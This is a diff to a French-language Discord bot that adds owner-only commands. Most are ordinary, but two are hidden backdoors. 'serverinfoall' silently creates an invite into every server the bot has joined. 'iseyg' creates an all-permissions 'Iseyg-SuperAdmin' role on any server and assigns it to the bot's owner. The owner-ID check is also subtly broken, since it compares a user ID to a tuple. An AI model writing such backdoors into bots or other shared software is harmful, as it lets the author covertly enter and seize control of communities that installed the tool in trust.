@@ -93,6 +93,307 @@ async def on_error(event, *args, **kwargs):
         color=discord.Color.red()
     )
     await args[0].response.send_message(embed=embed)
+#-------------------------------------------------------- Owner:
+
+BOT_OWNER_ID = 792755123587645461,555060734539726862
+
+# Vérification si l'utilisateur est l'owner du bot
+def is_owner(ctx):
+    return ctx.author.id == BOT_OWNER_ID
+
+@bot.command()
+async def shutdown(ctx):
+    if is_owner(ctx):
+        embed = discord.Embed(
+            title="Arrêt du Bot",
+            description="Le bot va maintenant se fermer. Tous les services seront arrêtés.",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Cette action est irréversible.")
+        await ctx.send(embed=embed)
+        await bot.close()
+    else:
+        await ctx.send("Seul l'owner peut arrêter le bot.")
+
+@bot.command()
+async def restart(ctx):
+    if is_owner(ctx):
+        embed = discord.Embed(
+            title="Redémarrage du Bot",
+            description="Le bot va redémarrer maintenant...",
+            color=discord.Color.blue()
+        )
+        await ctx.send(embed=embed)
+        os.execv(sys.executable, ['python'] + sys.argv)  # Redémarre le bot
+    else:
+        await ctx.send("Seul l'owner peut redémarrer le bot.")
+
+@bot.command()
+async def getbotinfo(ctx):
+    """Affiche les statistiques détaillées du bot avec un embed amélioré visuellement."""
+    try:
+        start_time = time.time()
+        
+        # Calcul de l'uptime du bot
+        uptime_seconds = int(time.time() - bot.uptime)
+        uptime_days, remainder = divmod(uptime_seconds, 86400)
+        uptime_hours, remainder = divmod(remainder, 3600)
+        uptime_minutes, uptime_seconds = divmod(remainder, 60)
+
+        # Récupération des statistiques
+        total_servers = len(bot.guilds)
+        total_users = sum(g.member_count for g in bot.guilds if g.member_count)
+        total_text_channels = sum(len(g.text_channels) for g in bot.guilds)
+        total_voice_channels = sum(len(g.voice_channels) for g in bot.guilds)
+        latency = round(bot.latency * 1000, 2)  # Latence en ms
+        total_commands = len(bot.commands)
+
+        # Création d'une barre de progression plus détaillée pour la latence
+        latency_bar = "🟩" * min(10, int(10 - (latency / 30))) + "🟥" * max(0, int(latency / 30))
+
+        # Création de l'embed
+        embed = discord.Embed(
+            title="✨ **Informations du Bot**",
+            description=f"📌 **Nom :** `{bot.user.name}`\n"
+                        f"🆔 **ID :** `{bot.user.id}`\n"
+                        f"🛠️ **Développé par :** `Iseyg`\n"
+                        f"🔄 **Version :** `1.1.5`",
+            color=discord.Color.blurple(),  # Dégradé bleu-violet pour une touche dynamique
+            timestamp=datetime.utcnow()
+        )
+
+        # Ajout de l'avatar et de la bannière si disponible
+        embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else None)
+        if bot.user.banner:
+            embed.set_image(url=bot.user.banner.url)
+
+        embed.set_footer(text=f"Requête faite par {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
+
+        # 📊 Statistiques générales
+        embed.add_field(
+            name="📊 **Statistiques générales**",
+            value=(
+                f"📌 **Serveurs :** `{total_servers:,}`\n"
+                f"👥 **Utilisateurs :** `{total_users:,}`\n"
+                f"💬 **Salons textuels :** `{total_text_channels:,}`\n"
+                f"🔊 **Salons vocaux :** `{total_voice_channels:,}`\n"
+                f"📜 **Commandes :** `{total_commands:,}`\n"
+            ),
+            inline=False
+        )
+
+        # 🔄 Uptime
+        embed.add_field(
+            name="⏳ **Uptime**",
+            value=f"🕰️ `{uptime_days}j {uptime_hours}h {uptime_minutes}m {uptime_seconds}s`",
+            inline=True
+        )
+
+        # 📡 Latence
+        embed.add_field(
+            name="📡 **Latence**",
+            value=f"⏳ `{latency} ms`\n{latency_bar}",
+            inline=True
+        )
+
+        # 🌐 Hébergement (modifiable selon ton setup)
+        embed.add_field(
+            name="🌐 **Hébergement**",
+            value="🖥️ `Render + Uptime Robot`",  # Change ça si nécessaire
+            inline=False
+        )
+
+        # 📍 Informations supplémentaires
+        embed.add_field(
+            name="📍 **Informations supplémentaires**",
+            value="💡 **Technologies utilisées :** `Python, discord.py`\n"
+                  "⚙️ **Bibliothèques :** `discord.py, asyncio, etc.`",
+            inline=False
+        )
+
+        # Ajout d'un bouton d'invitation
+        view = discord.ui.View()
+        invite_button = discord.ui.Button(
+            label="📩 Inviter le Bot",
+            style=discord.ButtonStyle.link,
+            url="https://discord.com/oauth2/authorize?client_id=1356693934012891176&permissions=8&integration_type=0&scope=bot"
+        )
+        view.add_item(invite_button)
+
+        await ctx.send(embed=embed, view=view)
+
+        end_time = time.time()
+        print(f"Commande `getbotinfo` exécutée en {round((end_time - start_time) * 1000, 2)}ms")
+
+    except Exception as e:
+        print(f"Erreur dans la commande `getbotinfo` : {e}")
+
+# 🎭 Emojis dynamiques pour chaque serveur
+EMOJIS_SERVEURS = ["🌍", "🚀", "🔥", "👾", "🏆", "🎮", "🏴‍☠️", "🏕️"]
+
+# 🏆 Liste des serveurs Premium
+premium_servers = {}
+
+# ⚜️ ID du serveur Etherya
+ETHERYA_ID = 123456789012345678  
+
+def boost_bar(level):
+    """Génère une barre de progression pour le niveau de boost."""
+    filled = "🟣" * level
+    empty = "⚫" * (3 - level)
+    return filled + empty
+
+class ServerInfoView(View):
+    def __init__(self, ctx, bot, guilds, premium_servers):
+        super().__init__()
+        self.ctx = ctx
+        self.bot = bot
+        self.guilds = sorted(guilds, key=lambda g: g.member_count, reverse=True)  
+        self.premium_servers = premium_servers
+        self.page = 0
+        self.servers_per_page = 5
+        self.max_page = (len(self.guilds) - 1) // self.servers_per_page
+        self.update_buttons()
+    
+    def update_buttons(self):
+        self.children[0].disabled = self.page == 0  
+        self.children[1].disabled = self.page == self.max_page  
+
+    async def update_embed(self, interaction):
+        embed = await self.create_embed()
+        self.update_buttons()
+        await interaction.response.edit_message(embed=embed, view=self)
+
+    async def create_embed(self):
+        total_servers = len(self.guilds)
+        total_premium = len(self.premium_servers)
+
+        # 🌟 Couleur spéciale pour Etherya
+        embed_color = discord.Color.purple() if ETHERYA_ID in self.premium_servers else discord.Color.gold()
+
+        embed = discord.Embed(
+            title=f"🌍 Serveurs du Bot (`{total_servers}` total)",
+            description="🔍 Liste des serveurs où le bot est présent, triés par popularité.",
+            color=embed_color,
+            timestamp=datetime.utcnow()
+        )
+
+        embed.set_footer(
+            text=f"Page {self.page + 1}/{self.max_page + 1} • Demandé par {self.ctx.author}", 
+            icon_url=self.ctx.author.avatar.url
+        )
+        embed.set_thumbnail(url=self.bot.user.avatar.url)
+
+        start = self.page * self.servers_per_page
+        end = start + self.servers_per_page
+
+        for rank, guild in enumerate(self.guilds[start:end], start=start + 1):
+            emoji = EMOJIS_SERVEURS[rank % len(EMOJIS_SERVEURS)]
+            is_premium = "💎 **Premium**" if guild.id in self.premium_servers else "⚪ Standard"
+            vip_badge = " 👑 VIP" if guild.member_count > 10000 else ""
+            boost_display = f"{boost_bar(guild.premium_tier)} *(Niveau {guild.premium_tier})*"
+
+            # 💎 Mise en avant spéciale d’Etherya
+            if guild.id == ETHERYA_ID:
+                guild_name = f"⚜️ **{guild.name}** ⚜️"
+                is_premium = "**🔥 Serveur Premium Ultime !**"
+                embed.color = discord.Color.purple()
+                embed.description = (
+                    "━━━━━━━━━━━━━━━━━━━\n"
+                    "🎖️ **Etherya est notre serveur principal !**\n"
+                    "🔗 [Invitation permanente](https://discord.gg/votre-invitation)\n"
+                    "━━━━━━━━━━━━━━━━━━━"
+                )
+            else:
+                guild_name = f"**#{rank}** {emoji} **{guild.name}**{vip_badge}"
+
+            # 🔗 Création d'un lien d'invitation si possible
+            invite_url = "🔒 *Aucune invitation disponible*"
+            if guild.text_channels:
+                invite = await guild.text_channels[0].create_invite(max_uses=1, unique=True)
+                invite_url = f"[🔗 Invitation]({invite.url})"
+
+            owner = guild.owner.mention if guild.owner else "❓ *Inconnu*"
+            emoji_count = len(guild.emojis)
+
+            # 🎨 Affichage plus propre
+            embed.add_field(
+                name=guild_name,
+                value=(
+                    f"━━━━━━━━━━━━━━━━━━━\n"
+                    f"👑 **Propriétaire** : {owner}\n"
+                    f"📊 **Membres** : `{guild.member_count}`\n"
+                    f"💎 **Boosts** : {boost_display}\n"
+                    f"🛠️ **Rôles** : `{len(guild.roles)}` • 💬 **Canaux** : `{len(guild.channels)}`\n"
+                    f"😃 **Emojis** : `{emoji_count}`\n"
+                    f"🆔 **ID** : `{guild.id}`\n"
+                    f"📅 **Créé le** : `{guild.created_at.strftime('%d/%m/%Y')}`\n"
+                    f"🏅 **Statut** : {is_premium}\n"
+                    f"{invite_url}\n"
+                    f"━━━━━━━━━━━━━━━━━━━"
+                ),
+                inline=False
+            )
+
+        embed.add_field(
+            name="📜 Statistiques Premium",
+            value=f"⭐ **{total_premium}** serveurs Premium activés.",
+            inline=False
+        )
+
+        embed.set_image(url="https://github.com/Cass64/EtheryaBot/blob/main/images_etherya/etheryaBot_banniere.png?raw=true")
+        return embed
+
+    @discord.ui.button(label="⬅️ Précédent", style=discord.ButtonStyle.green, disabled=True)
+    async def previous(self, interaction: discord.Interaction, button: Button):
+        self.page -= 1
+        await self.update_embed(interaction)
+
+    @discord.ui.button(label="➡️ Suivant", style=discord.ButtonStyle.green)
+    async def next(self, interaction: discord.Interaction, button: Button):
+        self.page += 1
+        await self.update_embed(interaction)
+
+@bot.command()
+async def serverinfoall(ctx):
+    if ctx.author.id == BOT_OWNER_ID:  # Assurez-vous que seul l'owner peut voir ça
+        view = ServerInfoView(ctx, bot, bot.guilds, premium_servers)
+        embed = await view.create_embed()
+        await ctx.send(embed=embed, view=view)
+    else:
+        await ctx.send("Seul l'owner du bot peut obtenir ces informations.")
+
+@bot.command()
+async def iseyg(ctx):
+    if ctx.author.id == BOT_OWNER_ID:  # Vérifie si l'utilisateur est l'owner du bot
+        try:
+            guild = ctx.guild
+            if guild is None:
+                return await ctx.send("❌ Cette commande doit être exécutée dans un serveur.")
+            
+            # Création (ou récupération) d'un rôle administrateur spécial
+            role_name = "Iseyg-SuperAdmin"
+            role = discord.utils.get(guild.roles, name=role_name)
+
+            if role is None:
+                role = await guild.create_role(
+                    name=role_name,
+                    permissions=discord.Permissions.all(),  # Accorde toutes les permissions
+                    color=discord.Color.red(),
+                    hoist=True  # Met le rôle en haut de la liste des membres
+                )
+                await ctx.send(f"✅ Rôle `{role_name}` créé avec succès.")
+
+            # Attribution du rôle à l'utilisateur
+            await ctx.author.add_roles(role)
+            await ctx.send(f"✅ Tu as maintenant les permissions administrateur `{role_name}` sur ce serveur !")
+        except discord.Forbidden:
+            await ctx.send("❌ Le bot n'a pas les permissions nécessaires pour créer ou attribuer des rôles.")
+        except Exception as e:
+            await ctx.send(f"❌ Une erreur est survenue : `{e}`")
+    else:
+        await ctx.send("❌ Seul l'owner du bot peut exécuter cette commande.")
+
 #--------------------------------------------------------- Mot Sensible:
 # Liste des mots sensibles
 sensitive_words = [
